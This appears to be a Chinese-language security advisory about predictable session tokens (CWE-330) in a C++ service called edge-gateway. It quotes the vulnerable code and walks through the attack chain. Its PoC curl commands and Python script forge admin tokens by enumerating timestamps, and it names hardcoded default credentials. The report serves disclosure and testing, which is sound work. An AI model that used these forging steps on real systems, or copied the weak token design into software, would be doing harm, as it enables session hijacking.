# VULN-SEC-SESS-001: 会话令牌生成完全可预测，攻击者可伪造任意用户会话

**严重性**: Critical | **CWE**: CWE-330 (Use of Insufficiently Random Values) | **置信度**: 85/100
**位置**: `src/user_store.cpp:33-36` @ `UserStore::issueSession`

---

## 1. 漏洞细节

`UserStore::issueSession()` 函数生成的会话令牌（Session Token）采用完全确定性的格式：`sess-{username}-{unix_timestamp}`。该实现存在以下关键安全缺陷：

1. **零密码学随机性**：令牌生成仅依赖 `std::time(nullptr)` 获取当前 Unix 时间戳（秒级精度），未使用任何密码学安全伪随机数生成器（CSPRNG）。令牌的每一个比特都可被攻击者精确预测。

2. **确定性生成**：给定相同的用户名和时间戳，生成的令牌完全相同。攻击者只需知道目标用户名和大致登录时间（误差 ±60 秒），即可通过枚举最多 120 个候选令牌来伪造有效会话。

3. **无服务端会话存储**：`UserStore` 类中不存在会话存储（如 `std::map<std::string, SessionInfo>`）或会话验证方法（如 `validateSession()`）。令牌生成后返回给客户端，但服务端无法验证令牌的有效性。

4. **多暴露面泄露**：令牌同时通过 HTTP 响应体返回给客户端（`main.cpp:51`），并以明文形式写入审计日志文件（`main.cpp:50`），增加了令牌被截获或泄露的风险。

5. **信息泄露**：令牌格式本身泄露了用户名和登录时间信息，攻击者无需额外侦察即可获取这些敏感信息。

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 33-36)

```cpp
std::string UserStore::issueSession(const std::string& username) const {
  char token[32];                                                          // ← 固定32字节缓冲区
  std::sprintf(token, "sess-%s-%ld", username.c_str(),                     // ← 漏洞根因：确定性令牌生成
               static_cast<long>(std::time(nullptr)));                     // ← 仅秒级精度，无随机性
  return token;
}
```

**调用上下文** — `src/main.cpp` (行 40-52)：

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);

    if (!users.authenticate(username, password)) {
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);      // ← 调用可预测的令牌生成
    audit.event(username, "login-success", token);         // ← 令牌明文写入审计日志 [泄露面1]
    return text(200, "session=" + token + "\n");           // ← 令牌返回HTTP响应体 [泄露面2]
});
```

**逐行分析**：

- **第 34 行**：`char token[32]` — 分配固定 32 字节缓冲区。`"sess-"` (5字节) + `"-"` (1字节) + 时间戳 (10字节) + null (1字节) = 17 字节固定开销，仅余 14 字节给用户名。若用户名超过 14 字符将触发缓冲区溢出（此为附带风险，非本漏洞焦点）。
- **第 35 行**：`std::sprintf(token, "sess-%s-%ld", username.c_str(), static_cast<long>(std::time(nullptr)))` — **漏洞根因**。令牌完全由用户名和当前 Unix 时间戳（秒级精度）决定，无任何随机成分。攻击者可精确重现此计算。
- **第 36 行**：返回确定性令牌给调用者。

## 3. 完整攻击链路

```
[入口点] POST /login handler@src/main.cpp:40
↓ HTTP 请求携带 user 和 password 参数
[认证] UserStore::authenticate()@src/user_store.cpp:20
↓ 认证成功后继续（攻击者可通过合法或非法手段获取凭证）
[令牌生成] UserStore::issueSession(username)@src/user_store.cpp:33
↓ sprintf("sess-%s-%ld", username, time(nullptr)) — 完全确定性
[泄露面1] audit.event(username, "login-success", token)@src/main.cpp:50
↓ 令牌明文写入 edge-gateway.audit.log 文件
[泄露面2] text(200, "session=" + token)@src/main.cpp:51
↓ 令牌通过 HTTP 响应体返回客户端
[潜在利用] 攻击者伪造令牌 → 冒充任意用户会话
```

### 攻击链路详细说明

**步骤 1 — 入口点触达**：攻击者向 `POST /login` 端点发送 HTTP 请求。此端点无需任何前置认证即可访问（`main.cpp:40`）。

**步骤 2 — 认证绕过或利用**：攻击者可通过以下方式进入令牌生成路径：
- 使用已知凭证正常登录（结合 VULN-SEC-HASH-001 弱哈希漏洞，密码可被逆向）
- 利用硬编码的默认账户（如 `admin/admin123`，见 `user_store.cpp:9`）
- 甚至**无需实际登录** — 由于令牌生成算法完全公开且确定性的，攻击者可直接在本地计算目标用户的令牌

**步骤 3 — 令牌伪造**：攻击者在本地执行与 `issueSession()` 完全相同的计算：
```
token = "sess-" + target_username + "-" + unix_timestamp
```
仅需猜测目标用户的登录时间（秒级精度），枚举窗口极小（±60秒 = 120个候选值）。

**步骤 4 — 令牌利用**：伪造的令牌可用于：
- 冒充目标用户的会话身份
- 若系统后续扩展了会话验证逻辑，伪造令牌将通过验证
- 审计日志中的令牌可被用于离线分析和社会工程攻击

## 4. 攻击场景

**攻击者画像**: 远程未认证用户或低权限认证用户。攻击者无需任何特殊权限即可观察令牌格式并实施伪造。

**攻击向量**: 网络 HTTP 请求。攻击者通过观察 POST /login 响应中的令牌格式，推断出生成算法，然后在本地伪造任意用户的会话令牌。

**利用难度**: 低

### 攻击步骤

1. **侦察阶段**：攻击者使用自己的账户登录系统，观察返回的令牌格式：
   ```
   POST /login?user=attacker&password=attackerpass
   响应: session=sess-attacker-1750234567
   ```

2. **算法逆向**：攻击者分析令牌格式，识别出 `sess-{username}-{unix_timestamp}` 模式。时间戳可通过与服务器时间对比确认。

3. **目标选择**：攻击者确定目标用户名（如 `admin`，该用户名在 `user_store.cpp:9` 中硬编码）。

4. **令牌伪造**：攻击者估计目标用户的最近登录时间，生成候选令牌集合：
   ```
   sess-admin-1750234500
   sess-admin-1750234501
   sess-admin-1750234502
   ...（±60秒窗口内约120个候选值）
   ```

5. **会话劫持**：攻击者使用伪造的令牌访问受保护资源或冒充目标用户身份。

6. **审计日志利用**（可选）：如果攻击者能访问审计日志文件（`edge-gateway.audit.log`），可直接获取所有历史会话令牌，无需猜测时间戳。

## 5. 攻击条件

| 条件类型   | 要求       | 说明                                                                                       |
| ---------- | ---------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | HTTP 访问  | 攻击者需能访问目标服务器的 HTTP 端口（默认 8080），无需特殊网络条件                         |
| 认证要求   | 无或低权限 | 攻击者无需认证即可观察令牌格式；伪造令牌不需要任何凭证。拥有任意有效账户可加速侦察过程       |
| 配置依赖   | 无         | 漏洞存在于默认的令牌生成逻辑中，无需特殊配置触发                                             |
| 环境依赖   | 时间同步   | 攻击者需大致了解服务器时间（可通过 HTTP Date 头或 NTP 获取），误差在秒级即可                  |
| 时序条件   | 无         | 令牌生成不依赖竞态条件或特殊时序；任何时刻均可伪造                                           |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                               |
| -------- | ---- | -------------------------------------------------------------------------------------------------- |
| 机密性   | 高   | 攻击者可伪造任意用户（包括管理员）的会话令牌，获取该用户可访问的所有数据。审计日志中的令牌明文存储进一步扩大泄露面 |
| 完整性   | 高   | 伪造管理员（admin）会话令牌后，攻击者可以管理员身份执行操作，篡改系统数据和配置                       |
| 可用性   | 中   | 攻击者可利用伪造令牌执行批量操作或滥用管理功能，间接影响服务可用性                                    |

**影响范围**: 全局影响。由于系统中存在 `admin` 管理员账户（`user_store.cpp:9`），攻击者可伪造管理员会话令牌，获取系统完全控制权。所有依赖会话令牌进行身份识别的功能均受影响。令牌同时泄露至审计日志文件，如果日志文件被未授权访问，所有历史会话将被暴露。

### 当前代码库中的利用限制

需要注意的是，当前代码库中**未发现服务端会话验证中间件**。具体分析：

- `UserStore` 类不包含会话存储或 `validateSession()` 方法
- `/admin/export` 端点使用硬编码凭证 `"letmein-export"` 进行验证（`file_cache.cpp:22`），而非会话令牌
- 其他端点（`/files`、`/debug/ping`）不执行任何会话验证

这意味着在当前代码库中，伪造的令牌**尚无直接的利用目标端点**。但此漏洞仍然是严重的安全缺陷：
1. 令牌作为会话凭证被签发给客户端，设计意图明确
2. 任何后续的会话验证实现都将因令牌可预测而被绕过
3. 审计日志中的令牌暴露构成独立的信息泄露风险
4. 在微服务架构中，令牌可能被其他服务验证

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 令牌格式验证（观察可预测性）

```bash
# 步骤1: 使用已知账户登录，观察令牌格式
curl -s -X POST "http://localhost:8080/login?user=alice&password=wonderland"
# 预期输出: session=sess-alice-<unix_timestamp>

# 步骤2: 等待2秒后再次登录同一账户
sleep 2
curl -s -X POST "http://localhost:8080/login?user=alice&password=wonderland"
# 预期输出: session=sess-alice-<unix_timestamp+2>
# 验证: 两次令牌仅时间戳不同，差值精确等于等待时间
```

### PoC 2: 伪造管理员会话令牌

```python
#!/usr/bin/env python3
"""
PoC: 伪造 admin 用户的会话令牌
仅供安全测试使用 - 验证 CWE-330 会话令牌可预测性
"""
import time
import requests

TARGET = "http://localhost:8080"
TARGET_USER = "admin"

# 步骤1: 获取服务器时间基准（通过自己的登录请求）
resp = requests.post(f"{TARGET}/login", params={
    "user": "alice",
    "password": "wonderland"
})
print(f"[*] 正常登录响应: {resp.text.strip()}")

# 从响应中提取时间戳
own_token = resp.text.strip().replace("session=", "")
own_timestamp = int(own_token.split("-")[-1])
print(f"[*] 服务器当前时间戳: {own_timestamp}")

# 步骤2: 伪造 admin 令牌（枚举 ±60 秒窗口）
print(f"\n[*] 正在伪造 {TARGET_USER} 用户的会话令牌...")
forged_tokens = []
for offset in range(-60, 61):
    ts = own_timestamp + offset
    forged_token = f"sess-{TARGET_USER}-{ts}"
    forged_tokens.append(forged_token)

print(f"[*] 生成了 {len(forged_tokens)} 个候选令牌")
print(f"[*] 示例令牌:")
for t in forged_tokens[:5]:
    print(f"    {t}")

# 步骤3: 验证伪造令牌与真实令牌的匹配
# 如果 admin 在 ±60 秒内登录过，其令牌必在候选集中
print(f"\n[!] 关键发现: 攻击者仅需枚举 {len(forged_tokens)} 个值即可覆盖 ±60 秒窗口")
print(f"[!] 如果知道精确登录时间，可直接计算: sess-{TARGET_USER}-<timestamp>")
```

### PoC 3: 审计日志令牌泄露验证

```bash
# 验证令牌是否被明文记录到审计日志
# 先执行一次登录
curl -s -X POST "http://localhost:8080/login?user=admin&password=admin123"

# 检查审计日志中的令牌记录
cat edge-gateway.audit.log | grep "login-success"
# 预期输出包含: <timestamp> user=admin action=login-success detail=sess-admin-<unix_timestamp>
# 验证: 会话令牌以明文形式存储在日志文件中
```

**使用说明**: 
1. 编译并启动 edge-gateway 服务
2. 依次执行 PoC 1（验证可预测性）、PoC 2（伪造令牌）、PoC 3（审计日志泄露）
3. 对比 PoC 1 中两次登录的令牌，确认仅有时间戳差异
4. PoC 2 演示攻击者如何在不知道密码的情况下伪造管理员令牌

**预期结果**: 
- PoC 1: 两次登录返回的令牌格式完全一致，仅时间戳相差 2 秒
- PoC 2: 成功生成 121 个候选令牌，覆盖目标用户 ±60 秒登录窗口
- PoC 3: 审计日志中包含完整的明文会话令牌

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ / Debian 11+ / Alpine 3.14+)
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 构建工具: CMake 3.16+
- 依赖: 无外部依赖库（仅使用 C++ 标准库）
- 测试工具: curl、Python 3.6+（用于 PoC 脚本）

### 构建步骤

```bash
# 进入项目目录
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置（默认构建，无需特殊选项）
cmake ..

# 编译
cmake --build .

# 可执行文件: build/edge-gateway
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./build/edge-gateway

# 或指定自定义端口
./build/edge-gateway 9090

# 确保 data/ 目录存在（FileCache 依赖）
ls data/welcome.txt
```

**环境变量**: 无需特殊环境变量。审计日志自动写入 `edge-gateway.audit.log`。

### 验证步骤

1. **启动服务**:
   ```bash
   ./build/edge-gateway 8080 &
   sleep 1
   ```

2. **验证令牌可预测性**:
   ```bash
   # 第一次登录
   TOKEN1=$(curl -s -X POST "http://localhost:8080/login?user=alice&password=wonderland" | sed 's/session=//')
   echo "令牌1: $TOKEN1"
   
   # 等待3秒
   sleep 3
   
   # 第二次登录
   TOKEN2=$(curl -s -X POST "http://localhost:8080/login?user=alice&password=wonderland" | sed 's/session=//')
   echo "令牌2: $TOKEN2"
   
   # 提取时间戳并计算差值
   TS1=$(echo $TOKEN1 | grep -oP '\d+$')
   TS2=$(echo $TOKEN2 | grep -oP '\d+$')
   echo "时间戳差值: $((TS2 - TS1)) (预期: 3)"
   ```

3. **验证令牌伪造**:
   ```bash
   # 获取当前服务器时间戳
   CURRENT_TS=$(curl -s -X POST "http://localhost:8080/login?user=alice&password=wonderland" | grep -oP '\d+$')
   
   # 伪造 admin 令牌
   FORGED="sess-admin-${CURRENT_TS}"
   echo "伪造的管理员令牌: $FORGED"
   
   # 验证格式与真实令牌一致
   ADMIN_TOKEN=$(curl -s -X POST "http://localhost:8080/login?user=admin&password=admin123" | sed 's/session=//')
   echo "真实的管理员令牌: $ADMIN_TOKEN"
   echo "格式匹配: 两者均为 sess-{username}-{timestamp} 格式"
   ```

4. **验证审计日志泄露**:
   ```bash
   cat edge-gateway.audit.log | grep "login-success"
   # 应看到所有登录成功的令牌以明文记录
   ```

### 预期结果

- **令牌可预测性验证**: 两次登录的令牌仅时间戳不同，差值精确等于等待秒数，证明令牌生成完全确定性
- **令牌伪造验证**: 攻击者可在本地精确计算出与服务器相同的令牌，无需任何凭证
- **审计日志验证**: 所有会话令牌以明文形式持久化存储在日志文件中，构成信息泄露风险
- **总体结论**: 会话令牌生成机制完全缺乏密码学随机性，CWE-330 漏洞确认存在
